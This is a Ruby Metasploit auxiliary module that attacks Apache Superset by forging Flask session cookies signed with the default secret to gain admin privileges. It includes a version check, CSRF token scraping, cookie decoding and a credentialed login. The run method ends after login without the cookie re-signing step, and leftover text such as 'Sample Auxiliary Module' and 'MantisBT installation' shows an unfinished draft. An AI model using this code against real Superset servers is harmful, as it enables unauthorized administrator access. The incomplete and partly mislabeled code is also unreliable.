##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::FlaskUnsign
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Apache Superset Signed Cookie Priv Esc',
        # The description can be multiple lines, but does not preserve formatting.
        'Description' => 'Sample Auxiliary Module',
        'Author' => [
          'h00die', # MSF module
          'paradoxis', #  original flask-unsign tool
          'zeroSteiner' # flask_unsign implementation
        ], # MSF flask-unsign library
        'License' => MSF_LICENSE,
        'Actions' => [
          [ 'Sign Cookie', { 'Description' => 'Attempts to login to the site, then change the cookie value' } ],
        ],
        # https://docs.metasploit.com/docs/development/developing-modules/module-metadata/definition-of-module-reliability-side-effects-and-stability.html
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        },
        'DefaultAction' => 'Sign Cookie'
      )
    )
    register_options(
      [
        Opt::RPORT(8088),
        OptString.new('USERNAME', [true, 'The username to authenticate as', nil]),
        OptString.new('PASSWORD', [true, 'The password for the specified username', nil]),
        OptInt.new('ADMIN_ID', [true, 'The ID of an admin account', 1]),
        OptString.new('SECRET', [true, 'The secret used by flask to sign a cookie', 'CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET']),
        OptString.new('TARGETURI', [ true, 'Relative URI of MantisBT installation', '/'])
      ]
    )
  end

  def check
    res = send_request_cgi!({
      'uri' => normalize_uri(target_uri.path, 'login')
    })
    return Exploit::CheckCode::Unknown("#{peer} - Could not connect to web service - no response") if res.nil?
    return Exploit::CheckCode::Unknown("#{peer} - Unexpected response code (#{res.code})") unless res.code == 200
    return Exploit::CheckCode::Safe("#{peer} - Unexpected response, version_string not detected") unless res.body.include? 'version_string'
    unless res.body =~ /&#34;version_string&#34;: &#34;([\d.]+)&#34;/
      return Exploit::CheckCode::Safe("#{peer} - Unexpected response, unable to determine version_string")
    end

    version = Rex::Version.new(Regexp.last_match(1))
    if version < Rex::Version.new('2.0.1') && version >= Rex::Version.new('1.4.1')
      Exploit::CheckCode::Vulnerable("Apache Supset #{version} is vulnerable")
    else
      Exploit::CheckCode::Safe("Apache Supset #{version} is NOT vulnerable")
    end
  end

  def run
    res = send_request_cgi!({
      'uri' => normalize_uri(target_uri.path, 'login'),
      'keep_cookies' => true
    })
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response code (#{res.code})") unless res.code == 200

    fail_with(Failure::NotFound, 'Unable to determine csrf token') unless res.body =~ /name="csrf_token" type="hidden" value="([\w.-]+)">/

    csrf_token = Regexp.last_match(1)
    vprint_status("#{peer} - CSRF Token: #{csrf_token}")
    cookie = res.get_cookies.to_s
    print_status("#{peer} - Initial Cookie: #{cookie}")
    decoded_cookie = FlaskUnsign::Session.decode(cookie.split('=')[1].gsub(';', ''))
    print_status("#{peer} - Decoded Cookie: #{decoded_cookie}")
    print_status('Attempting login')
    res = send_request_cgi!({
      'uri' => normalize_uri(target_uri.path, 'login', '/'),
      'method' => 'POST',
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {
        'username' => datastore['USERNAME'],
        'password' => datastore['PASSWORD'],
        'csrf_token' => csrf_token
      }
    })
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::NoAccess, "#{peer} - Failed login") if res.body.include? 'Sign In'
  end
end
